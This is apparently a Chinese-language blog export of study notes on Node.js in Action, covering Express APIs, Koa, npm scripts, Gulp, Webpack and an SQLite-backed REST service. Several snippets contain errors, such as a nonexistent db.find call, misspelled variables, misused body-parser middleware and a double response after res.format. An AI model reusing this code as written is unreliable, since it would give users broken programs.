&#123; User.get(req.params.id, (err, user) =&gt; &#123; if (err) return next(err); if (!user.id) return res.send(404); res.json(user); &#125;);&#125; 然后将这个路由，加到 app.js 中 1app.get(&apos;/api/user:id&apos;,api.user); 4.测试用户数据获取启动程序，然后用命令行工具 cURL 进行测试，URL中提供了凭证 tobi:ferret，cURL 用它生成了 Authorization 请求头域： 1curl http://tobi:ferret@127.0.0.1:3000/api/user/4 -v 下面会测试结果： 4 是ID ，可以用 redis-cli 的 GET user:ids 来获取 id 名。 5.去掉敏感的用户数据上面的图片中，用户的密码和盐都在，可以在 User 中将它们去掉： 123456toJSON()&#123; return &#123; id: this.id, name: this.name &#125;&#125; 如果有了 .toJSON ,JSON.stringify 就会用返回的 JSON 数据，现在再发送之前那个 cURL 请求，就只有 ID 和 name 属性了。 6.添加消息因为通过 API 添加消息的实现和通过 HTML 表单添加的实现时几乎一模一样，所以可以重用之前 实现的 entries.submit() 路由逻辑. 不同的是 entries.submit()中，消息要有用户名和其他细节消息，所以需要修改用户加载中间件，用 basic-auth 中间件加载的用户数据封装在 res.locals.user 。之前在进行基本认证时，我们将用户数据设为了 请求对象的属性 req.remoteUser.现在只要在用户加载中间件中检查这个属性就可以了。按照下面修改 middleware/user.js 中的 module.exports 定义，用户加载中间件就能跟 API 进行协作了。 123456789101112module.exports = (req, res, next) =&gt; &#123; if (req.remoteUser) &#123; res.locals.user = req.remoteUser; &#125; const uid = req.session.uid; if (!uid) return next(); User.get(uid, (err, user) =&gt; &#123; if (err) return next(err); req.user = res.locals.user = user; next(); &#125;)&#125; 存在一个问题，现在添加消息的响应还是重定向到首页，我们要针对 API 请求调整一下。 123456789// routes/entries.jsentry.save((err) =&gt; &#123; if (err) return next(err); if (req.remoteUser) &#123; res.json(&#123; message: 'Entry added.' &#125;); &#125; else &#123; res.redirect('/'); &#125;&#125;); 启用消息添加 API 1app.post('/api/entry',entries.submit); 用下面的 cURL 命令测试消息添加 API。它发送的标题和内容主体数据所用的名称跟 HTML表单输入域的名称相同： 1curl -X POST -d "entry[title]='Ho ho ho'&amp;entry[body]='Santa loves you'" http://tobi:ferret@127.0.0.1:3000/api/entry 7.支持消息列表接下来要实现的API 路由是 GET/api/entries/:page?。 12345678// app.jsexports.entries = (req, res, next) =&gt; &#123; const page = req.page; Entry.getRange(page.from, page.to, (err, entries) =&gt; &#123; if (err) return next(err); res.json(entries); &#125;);&#125;; 8.实现分页中间件在分页时，要查询字符串串？page=N 来确定当前页面。 12345678910111213141516171819202122232425// .middleware/page.jsmodule.exports = (cb, perpage) =&gt; &#123; // 每页记录条数的默认值为 10 perpage = perpage || 10; // 返回中间件函数 return (req, res, next) =&gt; &#123; // 将参数 page 解析为十进制的整型值 let page = Math.max(parseInt(req.params.page || '1', 10), 1) - 1; // 调用传入的函数 cb((err, total) =&gt; &#123; if (err) return next(err); // 保存 page 来以后的引用 req.page = res.locals.page = &#123; number: page, perpage: perpage, from: page * perpage, to: page * perpage + perpage - 1, total: total, count: Math.ceil(total / perpage) &#125; // 将控制权交给中间件 next(); &#125;); &#125;&#125; 这个中间件抓取赋值给 ？page = N 的值，比如 ?page = 1,然后取得结果集的总数，并预先计算出一些值拼成 page 对象，把它输出到需要渲染的视图中。把这些值放在模板外计算可以减少模板中的逻辑，让模板更加简洁。 9.测试消息路由下面的 cURL 命令从API获取消息： 1curl http://tobi:ferret@127.0.0.1:3000/api/entries 输出的结果是一个 JSON 数组。 启用内容协商内容协商让客户端可以指定它乐于接受并且喜欢的数据格式。本节介绍如何让API 提供JSON 和 XML 格式的数据，以便于 API 的使用可以决定他们要使用哪种数据格式。 HTTP 通过 accept 请求头域提供了内容协商机制，比如说，某个客户端更喜欢 HTML ，但是也可以接受普通的文本，则可以这样设定请求头： 1Accept: text/plain; q = 0.5,text/html q(qvalue)表明即便 text/html 放在第二位，它的优先级也比 text/plain 高 50%。Express 会解析这个消息并提供一个规范化的 req.accepted 数组： 12345[&#123; value:'text/html',quality:1&#125;,&#123; value:'text/plain',quality:0.5&#125;] Express 还提供了 res.format() 方法，它的参数是一个 MIME 类型的数组和一些回调函数。 Express 会决定客户端愿意接受什么格式的数据，以及你愿意提供什么格式的数据，然后调用相应的会调函数。 1.实现内容协商在 router/api.js 中，支持内容协商的 GET/api/entries 路由如下面的例子。JSON 想之前那样被支持——用res.send()发送串行化为 JSON 的消息数据。XML 回调循环遍历消息，并将其写入 socket 中。注意，没必要显示设定 Content-type ,res.format() 会自动设定关联的类型。 12345678910111213141516171819202122232425262728exports.entries = (req, res, next) =&gt; &#123; const page = req.page; // 获取消息数据 Entry.getRange(page.from, page.to, (err, entries) =&gt; &#123; if (err) return next(err); // 基于 Accept 头的值返回不同的响应 res.format(&#123; 'application/json': () =&gt; &#123; res.send(entries); &#125;, // XML 响应 'application/xml': () =&gt; &#123; res.write('&lt;entries&gt;\n'); entries.forEach(entry =&gt; &#123; res.write(` &lt;entry&gt; &lt;title&gt;$&#123;entry.title&#125;&lt;/title&gt; &lt;body&gt;$&#123;entry.body&#125;&lt;/body&gt; &lt;username&gt;$&#123;entry.username&#125;&lt;/username&gt; &lt;/entry&gt; `); &#125;); res.end('&lt;/entries&gt;'); &#125; &#125;); res.json(entries); &#125;);&#125;; 如果设定了默认响应格式回调，当用户请求的格式不在你特意提供的格式中时，就会执行这个默认回调函数。 res.format() 方法还可以将扩展映射到相关联的 MIME 类型上面。比如 用 json 和 xml 代替 application/json 和 application/xml ，就想下面这样。 12345678910111213141516171819202122232425262728exports.entries = (req, res, next) =&gt; &#123; const page = req.page; // 获取消息数据 Entry.getRange(page.from, page.to, (err, entries) =&gt; &#123; if (err) return next(err); // 基于 Accept 头的值返回不同的响应 res.format(&#123; json: () =&gt; &#123; res.send(entries); &#125;, // XML 响应 xml: () =&gt; &#123; res.write('&lt;entries&gt;\n'); entries.forEach(entry =&gt; &#123; res.write(` &lt;entry&gt; &lt;title&gt;$&#123;entry.title&#125;&lt;/title&gt; &lt;body&gt;$&#123;entry.body&#125;&lt;/body&gt; &lt;username&gt;$&#123;entry.username&#125;&lt;/username&gt; &lt;/entry&gt; `); &#125;); res.end('&lt;/entries&gt;'); &#125; &#125;); res.json(entries); &#125;);&#125;; 2.XML 响应 在路由中写一大堆代码只是为了返回 XML 响应，不是最简洁的方法，我们可以用视图系统来实现这一功能。 用下面的 EJS 创建一个 xml 模板。会循环遍历消息生成的 `标签。 123456789&lt;entries&gt; &lt;% entries.forEach(entry =&gt;&#123; %&gt; &lt;entry&gt; &lt;title&gt;&lt;%= entry.title %&gt;&lt;/title&gt; &lt;body&gt;&lt;%= entry.body %&gt;&lt;/body&gt; &lt;username&gt;&lt;%= entry.username %&gt;&lt;/username&gt; &lt;/entry&gt; &lt;% &#125;) %&gt;&lt;entries&gt; 然后，原来的 XML 回调以消息数组为参数的 res.render () 123xml: () =&gt; &#123; res.render('entries/xml', &#123; entries: entries &#125;);&#125; 测试： 1curl -i -H 'Accept: application/xml' http://tobi:ferret@127.0.0.1:3000/api/entries 总结： Connect 是一个 HTTP 框架，可以在处理请之前和之后堆叠中间件 Connect 中间件是一个函数，它的参数包括 Node 的请求和响应对象、一个调用下一个中间件的函数，以及一个可选的错误对象 Express Web 程序也是可用中间件搭建的。 在用 Expresss 实现 REST ful API 时，可以用 HTTP 谓语定义路由 Express 路由的响应可以是 JSON / HTML 以及其他格式定义的数据 Express 有个简单的模板引擎 API ，支持很多引擎。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— 服务器端框架]]></title>
    <url>%2F2018-12-07-NodeJs2-Part5.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 服务器端框架本章内容 使用热门的 Node Web 框架 选择合适的框架 用 Web 框架搭建 Web 程序 如何为给定项目选择最好的框架。 KoaKoa 是以 Express 为基础开发的，但它用 ESS2015 中的生成器语法来定义中间件，可以用 yield 退出和重入中间件。 主要特点：HTTP 服务器库，基于生成器的中间件，请求/响应模型，应用于轻型 Web 程序、不严格的 HTTP API、单页 Web 程序。 这段代码演示了 在 Koa 如何使用 yield 转到下一个中间件组件，等它执行完再回来继续执行调用者中间件的逻辑。 1234567891011121314const koa = require('koa');const app = koa();app.use(function*(next)&#123; const start = new Date(); // yield 以运行下一个中间件组件 yield next; const ms = new Date - start; console.log('%s %s - %s'，this.method, this.url, ms);&#125;);app.use(function*()&#123; // 运行完后回到最初 yield 的位置继续执行 this.body = 'Hello World';&#125;);app.listen(3000); 注意关键字 function *，这里是不可能用箭头函数的。用 yield 关键字将执行步骤转到中间件的栈中去，然后在下一个中间件返回后再回来。使用生成器函数带来的额外好处是只要设定 this.body 就好了。Express 则需要用函数发送响应：res.send(response)。在 Koa 中间件中， this 就是上下文。每个请求都有对应的上下文，用来封装 Node 的 HTTP request 和 response 对象。在需要访问请求里的东西时，比如 Get 参数或者是 cookie，可以通过这个请求上下文来访问。响应也是如此， 设定 this.body 的值就可以控制送什么给浏览器。 设置Koa 项目的设置工作包括安装模块和定义中间件。如果需要更多功能，比如要通过路由 API定义和响应各种 HTTP 请求，则需要安装路由中间件。 定义路由koa-router 是一个流行的路由器中间件组件。它也是基于 HTTP 动词的，这点跟 Express 一样，不同之处是它的链式 API。下面这段代码演示了它的路由定义： 1234567router.post('/pages',function*(next)&#123; // 创建页面&#125;).get('pages/:id',function*(next)&#123; // 渲染页面&#125;).put('pages-update','/pages/:id',function*(next)&#123; // 更新页面&#125;); 可以提供额外的参数给路由命名。这可以用来生成 URL，并不是所有 Node Web 框架都支持这一功能。这里有个例子： 1router.url('pages-update', '99'); 优缺点官网 总结 Koa 轻便、极简，在中间件中使用 ES2015 生成器语法。适合依赖外部 Web API 的单页Web 程序 hapi 的重点是 HTTP 服务器和路由。适合由很多小服务器组成的轻便后台。 Flatiron 是一组解耦的模块，既可以当作 Web MVC 框架来用，也可以当作更轻便的 Express库。Flatiron 跟 Connect 中间件是兼容的 Kraken 是基于 Express 的，添加了安全特性。可以用于 MVC。 Sails.js 是 Rails/Django 风格的 MVC 框架。有 ORM 和模板系统。 DerbyJS 是个同构框架，适合实时程序 LoopBack 帮我们省掉了写套路化代码的工作。它可以快速生成带有数据库支持的 REST API，并有个 API 管理界面。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— 前端构建系统]]></title>
    <url>%2F2018-12-06-NodeJs2-Part4.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 前端构建系统本章将介绍如何使用 npm 脚本、Gulp 和 Webpack 搭建易于维护的代码。因为可以使用 Babel 转译，所以无须担心浏览器对ES2015的支持。 了解基于 Node 的前端开发npm 可以用于前端模块，例如 React,也可以用于后台代码，比如 Express。lodash作为通用库，既可以用在 Node 中，也可以用在浏览器中。 也有专门针对客户端的模块系统，比如 Bower,也可以接着使用这些工具，但作为 Node 开发人员，应该优先考虑 npm。 另外比如像 Babel这种能将 ES2015转换成支持更广泛的 ES5 代码的转译器。还有像 UglifyJS这样的缩码器，以及像 ESLint这样的用来检验代码正确性的剪毛器也都越来越被前端开发人员所青睐。 为了可以更方便地构建环境，会使用 npm 脚本、Gulp或 Webpack。 用 npm 运行脚本Node 有 npm ,而 npm 能运行脚本。因此，用户要能够调用 npm start 和 npm test 之类的命令，在项目的 package.json 文件中，有个 scripts 属性，可以在那里指定自己的 npm start 命令： 1234567&#123; ... "scripts":&#123; "start": "node server.js" &#125;, ...&#125; node server.js 是默认的 start 命令，记得要创建 server.js 文件。我们一般会定义 test 属性，因为可以把测试框架作为依赖项，然后用 npm test 来运行测试脚本。例如，选择 Mocha 来测试，并且安装： 1npm i -S -D 如果在 package.json 中添加下面的语句，就不用全局安装了： 123456&#123; ... "scripts":&#123; "test":"./node_modules/.bin/mocha_test/*.js" &#125;&#125; 上例中的参数是传递给了 Mocha,也可以运行 npm 脚本时用两个连字符传入参数： 1npm test -- test/*.js 下表是常用的 npm 命令： 命令 package.json 属性 应用案例 start scripts.start 启动Web 应用服务器或 Electron 程序 stop scripts.stop 停掉 Web 应用服务器 restart 运行 stop，然后运行 restart install,postinstall scripts.install,scripts.postinstall 在安装了包之后运行本地构建命令，注意，postinstall 只能通过 npm run postinstall 运行 创建定制的 npmnpm run 命令等于 npm run-script，用 npm run script-name 可以运行任何脚本。用 Babel 构建客户端脚本的命令： 新建项目，然后安装必要的依赖项： 123npm init -ynpm i --S -D babel-cli babel-preset-es2015echo '&#123; "presets": ["es2015"] &#125;' &gt; .babelrc 现在有了一个具有基本 Babel ES2015工具和插件的 Node项目。接下来打package.json，在 scripts 下面添加 babel 属性。它应该安装到了 node_modules/.bin 文件夹下的脚本： 1"babel": "./node_modules/.bin/babel browser.js -d build/" 下面是 ES2015 语法写的代码，存为 browser.js 文件： 12345678class Example &#123; render()&#123; return '&lt;h1&gt;Example&lt;/h1&gt;'; &#125;&#125;const example = new Example();console.log(example.render()); 运行 npm run babel ,会出现一个 build 文件夹，里面有转义的 brower.js ，如下： 1234567891011121314151617181920212223'use strict';var _createClass = function () &#123; function defineProperties(target, props) &#123; for (var i = 0; i &lt; props.length; i++) &#123; var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); &#125; &#125; return function (Constructor, protoProps, staticProps) &#123; if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; &#125;; &#125;();function _classCallCheck(instance, Constructor) &#123; if (!(instance instanceof Constructor)) &#123; throw new TypeError("Cannot call a class as a function"); &#125; &#125;var Example = function () &#123; function Example() &#123; _classCallCheck(this, Example); &#125; _createClass(Example, [&#123; key: 'render', value: function render() &#123; return '&lt;h1&gt;Example&lt;/h1&gt;'; &#125; &#125;]); return Example;&#125;();var example = new Example();console.log(example.render()); 如果构建项目时，只需要做这件事，那么可以将这个任务的名称改为 build，但一般会加上 UglifyJS: 1npm i -S-D uglify-es 同样的在 package.json 中 添加脚本来调用 node_modules/.bin/uglifyJS 1"uglify": "./node_modules/.bin/uglifyjs build/browser.js -o build/browser.min.js" 然后，可以运行 npm run uglify.也可以组合命令，合并到 build 命令中 1"build": "npm run babel &amp;&amp; npm run uglify" 现在，运行 npm run build 就会执行那两个脚本。Babel 支持配置文件，可以在 .babelrc 文件中实现更复杂的行为。 配置前端构建工具使用 npm 脚本时，通常有三种配置前端构建工具的方法。 指定命令行参数，比如 ./node_modules/.bin/ uglify –source-map 。 针对项目创建 配置文件，将参数放在这个文件中，Babel和 ESLint 将配置参数添加到 package.json 中。 如果构建的过程复杂，要做到文件的复制、合并和转移。可以创建一个 shell 脚本，然后用 npm 脚本调用它。很多构建系统都提供了 JavaScript API 以实现自动化构建。 用Gulp 实现自动化Gulp 是基于流的构建系统。可以通过对流的引导来创建构建过程，除了转译和缩码还可以做很多事情。Gulp 之所以能实现高度重用，主要归功于两项技术：使用插件和自定义构建任务。 把 Gulp 添加到项目中添加Gulp需要用 npm 安装 gulp-cli 和 gulp 两个包，很多人会把 gulp-cli 安装在全局环境中，这样只需要输入 gulp 就可以运行 Gulp 了。新建文件夹，全局安装gulp-cli，创建一个带有Gulp 的 Node 项目： 12npm init -ynpm i -S-D gulp 创建 gulpfile.js. 打开这个文件，用 Gulp 构建一个小型的 React 项目，这里会用到 gulp-babel/gulp-sourcemaps/gulp-concat： 12npm i -S-D gulp-sourcemaps gulp-babel babel-preset-es2015npm i -S-D gulp-concat react react-dom babel-preset-react 往项目中添加 Gulp 插件时，把 npm 命令中的 参数 –save 换成 –save-dev ，如果为了试验新的插件并想把它们卸掉，可以使用 npm uninstall –save-dev ，把它们从 ./node_modules 里删掉，同时更新 package.json 文件。 Gulp 任务的创建以及运行创建 Gulp 任务需要在 gulpfile.js 中编写 Node 代码，调用 Gulp 的 API .Gulp 的 API 可以做很多事，比如查找文件，把对文件进行某种转换的插件拼到一起等。 下面的例子，打开 gulpfile.js 构建一个任务，用 gulp.src 查找 JSX 文件，用Babel 处理 ES2015 和 React ,然后把文件拼在一起。 12345678910111213141516171819const gulp = require('gulp');const sourcemaps = require('gulp-sourcemaps');const babel = require('gulp-babel');const concat = require('gulp-concat');gulp.task('default',()=&gt;&#123; return gulp.src('app/*.jsx') // 开始监测源文件，为调用构建源码映射 .pipe(sourcemaps.init()) // 使用 ES2015 和 React(JSX) 配置 gulp-babel .pipe(babel(&#123; presets:['es2015','react'] &#125;)) .pipe(concat('all.js')) // 单独写入源码映射文件 .pipe(sourcemaps.write('.')) // 将所有文件放到dist/目录下 .pipe(gulp.dest('dist'));&#125;); 在终端运行 gulp 就可以运行这个任务。创建一个 app/index.jsx 文件进行试验： 123456import React from 'react';import ReactDOM from 'react-dom';ReactDOM.render( &lt;h1&gt;Hello,World!&lt;/h1&gt;, document.getElementById('example')); 在 Gulp中，用 JavaScript表示构建阶段很容易。并且我们可以用 gulp.task() 往这个文件里添加自己的任务。这些任务通常都遵循相同的模式。 (1) 源文件——收集输入文件。(2) 转译——让它们依次通过一个个对它们进行转换的插件。(3) 合并——把这些文件合到一起，创建一个整体构建文件。(4) 输出——设定文件的目标地址或移动输出文件。 在前面那个例子中， sourcemaps 是个特例，因为它需要两次 pipe ：第一次是配置，最后一次是输出文件。这是因为源码映射需要把最初的代码行数映射到应该转译构建后的代码行数上。 监测变化 精简构建过程最简单的办法就是用 Gulp 插件监测文件系统的变化，但也有备选方案。有些库跟热重载配合很好，并且通用的DOM 和基于 CSS 的项目也会很适合 LiveReload 项目。 作为实例，可以将 gulp-watch 添加到项目中： 1npm i -S-D gulp-watch 添加检测任务，让它调用前面的那个例子中的默认任务： 1234const watch = require('gulp-watch');gulp.task('watch',()=&gt;&#123; watch('app/**.js',() =&gt; gulp.setMaxListeners('default'));&#125;); 这段代码定义了一个名为 watch 的任务，然后用 watch() 监测 React JSX 文件的变化。只要有文件发生了变化，默认的构建任务就会运行。只需稍稍修改，这个处方就可以用来构建SASS文件、优化图片，以及做需要在前端项目上做的很多事情。 在大项目中把任务分散到不同文件中项目规模变大后，一般会需要更多的 Gulp 任务。最终会出现一个大到难以理解的长文件，如果把代码分解成不同的模块，就可以解决这个问题。你已经看到了，Gulp是用 Node的模块系统来加载插件的。没有特殊的插件加载系统，就是标准模块。我们也可以用 Node 的模块系统分割超长的 gulpfile 文件，以便于维护。可以按如下步骤来使用分散的文件。 (1) 创建一个名为 gulp的文件夹以及一个名为 tasks的子目录。(2) 在各个文件中用 gulp.task() 语法定义任务，最好是每个任务放一个文件。(3) 创建一个名为 gulp/index.js的文件，在其中加载所有的 Gulp任务文件。(4) 在 gulpfile.js中引入这个 gulp/index.js文件。 Gulp 是一个通用的项目自动化工具。它适合管理项目里的跨平台清理脚本，比如运行复杂的客户端测试或者为数据库提供固定的测试环境。尽管它也可以构建客户端资产，但不如专门做这些事情的工具，也就是说相较之下，Gulp 需要更多的代码和配置来定义那些任务。Webpack就是这样的工具，专注于打包 JavaScript和 CSS模块。 用 Webpack 构建 Web 程序Webpack是专门用来构建 Web程序的。用 Gulp时，写 JavaScript 代码是为了驱动构建系统，所以会涉及写 gulpfile 和构建任务。而用 Webpack时，写的是配置文件，用插件和加载器添加新功能。有时候不需要额外的配置：在命令行里输入webpack ，将源文件的路径作为参数，它就能构建项目。 Webpack的优势之一是更容易快速搭建出一个支持增量式构建的构建系统。如果配置成文件发生变化时自动构建，Webpack不会因为一个文件发生变化而重新构建整个项目。所以它的构建更快，也更好理解。 使用打包器和插件Webpack插件是用来改变构建过程的行为的。这些行为包括自动将静态资源上传到Amazon S3或去掉输出中重复的文件等。 加载器是用来转换资源文件的。比如将 SASS 转换为 CSS，或者将 ES2015 转换为 ES5。加载器是函数，负责将输入的源文本转换为特定的文本输出。它们既可以是异步的，也可以是同步的。插件是可以挂接到 Webpack更底层 API的类的实例。 如果需要转换 React 代码、CoffeeScript、SASS 或其他转译语言，就用加载器。如果需要调整 JavaScript，或用某种方式处理文件，就用插件。 配置和运行 Webpack新建文件夹 1234npm init -ynpm install --save react react-domnpm install --save-dev webpack babel-loader babel-corenpm install --save-dev babel-preset-es2015 babel-preset-react 最后一条命令安装了 Babel 的 ES2015 插件和用于 Babel 的 React 转换器,创建webpack.config.js.我们要在这个文件里告诉 Webpack 去哪里找输入文件，把输出写到哪里，以及用哪些加载器。我们要对 React使用 babel-loader，还要对它做些额外的配置。代码如下： 12345678910111213141516171819const path = require('path');const webpack = require('webpack');module.exports = &#123; entry: './app/index.jsx', output: &#123; path: __dirname, filename: 'dist/bundle.js' &#125;, module: &#123; loaders: [ &#123; test: /.jsx?$/, loader: 'babel-loader', exclude: /node_modules/, query: &#123; presets: ['es2015', 'react'] &#125; &#125; ] &#125;&#125; 这个配置文件包含了成功构建一个以 ES2015 写的 React 程序所需的一切。里面的配置都很直白：定义一个 entry ，同时加载程序的主文件。然后指定输出应该写到哪里。如果这个文件不存在，Webpack会创建它。接着定义一个加载器，并用 test 把它关联到一个文件聚集搜索上。最后，设定加载器的选项。在这个例子中，这些选项加载了 ES2015和 React Babel插件。 用 Webpack 开发服务器Express 服务器会在文件发生变化后运行 Webpack，然后将变化后的资源文件提供给浏览器。为了不跟主服务器冲突，你应该把它跑在另外一个端口上，也就是说在开发过程中， script 标签要指向这个开发服务器提供的 URL 上。这个服务器会构建资源文件，但输出会放在内存里，而不是 Webpack 的输出文件夹里。webpack-dev-server 也可以用来做模块热加载，这与 LiveReload服务器的用法类似。 按下面的步骤把 webpack-dev-server添加到项目中。 (1) 用 npm i –save-dev webpack-dev-server@ 1.14.1 安装 webpack-dev-server。(2) 在 webpack.config.js的 output 属性中添加一个 publicPath 选项。(3) 在构建目录下添加 index.html文件，在这个文件中加载打包后的 JavaScript和 CSS文件，注意 URL中的端口是下一步中指定的那个端口。(4) 带着你想要用的选项运行服务器。比如 webpack-dev-server –hot –inline–content-base dist/ –port 3001 。(5) 访问 http://localhost:3001/ 加载这个程序。 Webpack 具体的可以自行百度 总结 npm脚本是实现简单任务自动化和脚本调用的最佳选择。 Gulp可以用 JavaScript编写更加复杂的任务，并且它是跨平台的。 如果 gulpfiles变得太长了，可以把代码分解到多个文件中。 Webpack可以用来生成客户端打包文件。 如果只需要构建客户端打包文件，用 Webpack可能比用 Gulp更省事儿。 Webpack支持热重载，也就是说刷新浏览器就能看出代码的变化。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejs实战 —— Node Web 程序是什么]]></title>
    <url>%2F2018-12-05-NodeJs2-Part3.html</url>
    <content type="text"><![CDATA[读 《node.js实战2.0》，进行学习记录总结。 当当网购买链接 豆瓣网1.0链接 Node Web 程序是什么了解 Node Web 程序的结构典型的Node Web 程序是由下面几部分组成的： package.json ： 一个包含依赖项列表和运行这个程序的命令的文件； public：静态资源文件 node_modules:项目的依赖项 程序代码： app.js 或 index.js ：设置程序的代码 models:数据库模型 views:渲染页面的模板 controllers或 routes :HTTP 请求处理器 middleware: 中间件组件 开始一个新的 Web 程序创建一个新目录，然后运行： 123mkdir latercd laternpm init -fy 安装 express 1npm i express -S 可以在 package.json，看到express 已经被安装上去了 123&quot;dependencies&quot;: &#123;&quot;express&quot;: &quot;^4.16.4&quot;&#125; 如果要卸载可以使用下面的命令： 1npm rm express -S 创建一个简单的服务器 1234567891011121314// index.jsconst express = require('express');// express() 创建一个程序实例const app = express();const port = process.env.PORT || 3000;// 添加路由处理器app.get('/',(req,res) =&gt;&#123; res.send('Hello World');&#125;);// 程序实例绑定到一个 TCP端口app.listen(port,()=&gt;&#123; console.log(`Express web app available at localhost: $&#123;port&#125;`);&#125;); 新增 package.json 文件的 npm 脚本 1234"scripts": &#123;"start": "node index.js","test": "echo \"Error: no test specified\" &amp;&amp; exit 1"&#125;, 运行程序： 1npm start 可以看到： 跟其他平台比较如果在 PHP 实现上面的程序，代码如下： 1&lt;?php echo '&lt;p&gt;Hello World&lt;/p&gt;'; ?&gt; 只有一行，并且一看就明白，那么这个更加复杂的 Node示例有什么优点呢？二者是编程范式上的区别：用 PHP，程序是页面；Node：程序是服务器，这个Node 示例可以完全控制请求和响应，不用配置服务器就可以做所有事情，如果要用 HTTP 压缩或 URL 转发，可以将这些功能作为程序的逻辑来实现。不需要把 HTTP 程序和逻辑分开，它们是程序的一部分。 搭建一个 RESTful Web 服务RESTful 服务可以方便创建和保存文件，将杂乱的 Web 页面变得整洁。 设计 RESTful 服务要想好操作，映射到 Express 路由上面。此例子，需要保存文章、获取文章、获取包含所有文章的列表和删除不再需要的文章这几个功能。分别对应下面的路由： POST /articles：创建新文章 GET /articles/:id ：获取指定文章 GET /articles：获取所有文章 DELETE /articles/:id ：删除指定文章 简单的 Express 程序实现了这些路由，现在使用 JavaScript 来存储文章 12345678910111213141516171819202122232425262728293031323334353637// index.jsconst express = require('express');// express() 创建一个程序实例const app = express();// 数组定义 文章articlesconst articles = [&#123; title: 'Example' &#125;];const port = process.env.PORT || 3000;// 添加路由处理器app.get('/', (req, res) =&gt; &#123; res.send('Hello World');&#125;);// 获取所有文章app.get('/articles', (req, res, next) =&gt; &#123; res.send(articles);&#125;);// 创建一篇文章app.post('/articles', (req, res, next) =&gt; &#123; res.send('OK');&#125;);// 获取指定文章app.get('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; console.log('Fetching:', id); res.send(articles[id]);&#125;);// 删除指定文章app.delete('/articles/:id', (req, res, next) =&gt; &#123; const id = req.params.id; console.log('Deleting:', id); delete articles[id]; res.send(&#123; message: 'Deleted' &#125;);&#125;);// 程序实例绑定到一个 TCP端口app.listen(port, () =&gt; &#123; console.log(`Express web app available at localhost: $&#123;port&#125;`);&#125;); Express 能自动将数组转换成 JSON 响应。 创建文章，处理 POST 请求需要消息体解析。安装解析器 1npm i -S body-parser 添加消息解析器: 12345678910111213// 消息解析器const bodyParser = require('body-parser');app.use(bodyParser);// 支持编码为 JSON 的消息请求体app.use(bodyParser.json());// 支持编码为表单的请求消息体app.use(bodyParser.urlencoded(&#123; extended: true &#125;));// 创建一篇文章app.post('/articles', (req, res, next) =&gt; &#123; const article = &#123; title: req.body.title &#125;; articles.push(article); res.send(article);&#125;); 添加数据库就往 Node程序中添加数据库而言，并没有一定之规，但一般会涉及下面几个步骤。 (1) 决定想要用的数据库系统。(2) 在 npm上看看那些实现了数据库驱动或对象-关系映射（ORM）的热门模块。(3) 用 npm –save 将模块添加到项目中。(4) 创建模型，封装数据库访问 API。(5) 把这些模型添加到 Express路由中。 创建数据库之前，添加路由处理代码，程序汇中的 HTTP 路由处理会向模型发起一个简单的调用 123456app.get('/articles', (req, res, next) =&gt; &#123; Article.all((err, articles) =&gt; &#123; if (err) return err; res.send(articles); &#125;);&#125;); 这个 HTTP 路由是用来获取所有文章的，所以对应的模型方法应该类似于 Article.all 。这要取决于数据库 API，一般来说应该是 Article.find({}, cb) 和 Article.fetchAll().then(cb) ，其中的 cb 是回调（callback）的缩写. 上例子中选择了 SQLite数据库，还有热门的 sqlite3 模块。SQLite 是进程内数据库，所以很方便：你不需要在系统上安装一个后台运行的数据库。你添加的所有数据都会写到一个文件里，也就是说程序停掉后再起来时数据还在，所以非常适合入门学习时用。 制作自己的模型 API文章应该能被创建、获取、删除，所以模型 Articles 应该提供一下的方法： Article.all(cb)：返回文章 Article.find(id,cd)：给定ID,找到对应的文章 Article.create({title,content},cb)：创建一篇有标题和内容的文章 Article.delete(id,cb)：根据ID删除文章 这些都可以用sqlite3模块实现。有了这个模块，我们可以用 db.all 获取多行数据，用db.get获取一行数据。不过先要有数据库连接。 安装 sqlite3： 1npm i -S sqlite3 接着在 ds.js 中实现代码完成上述功能。 123456789101112131415161718192021222324252627282930313233343536const sqlite3 = require('sqlite3');const dbName = 'later.sqlite';// 新建并连接到数据库文件const db = new sqlite3.Database(dbName);db.serialize(() =&gt; &#123; // 如果还没有，创建一个 articles 表 const sql = ` CREATE TABLE IF NOT EXISTS articles (id integer primary key, title, content TEXT) `; db.run(sql);&#125;);// 定义模型类 Articleclass Article &#123; // 获取所有文章 static all(cb) &#123; db.all('SELECT * FROM articles', cb); &#125; // 选择一篇指定的文章 static find(id, cb) &#123; db.find('SELECT * FROM articles WHERE id = ?', id, cb); &#125; static create(data, cb) &#123; // 问号表示参数 const sql = `INSERT INTO articles(title, content) VALUES (?, ?)`; db.run(sql, data, tile, data.contont, cb); &#125; static delete(id, cb) &#123; if (!id) return cb(new Error('please provide an id')); db.run('DELETE FROM articles WHERE id = ?', id, cb); &#125;&#125;module.exports = db;module.exports.Article = Article; 上面例子中创建了一个 名为 Article 的对象，它可以用标准的 SQL 和 sqlite3 创建、获取和删除数据。首先用 sqlite3.Database 打开一个数据库文件，然后创建表的 articles 。这里用到了 SQL 语法 IF NOT EXISTS ,以防一不小心重新运行了代码删除了前面的表重新创建一个。 数据库和表准备好了之后，就可以进行查询。用 sqlite3 的 all 方法可以获取的所有文章。用带问号的查询语法提供具体值的方法可以获取指定文章，sqlite3 会把 ID 插入到查询语句中，最后用 run 方法插入和删除数据。 基本的数据库功能已经实现了，接着我们把它添加到 HTTP 路由中。下面这段代码添加了所有方法，除了 POST 。（因为需要用到 readability模块，但你还没有装好，所以要单独处理。） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950const express = require('express');// express() 创建一个程序实例const app = express();// 消息解析器const bodyParser = 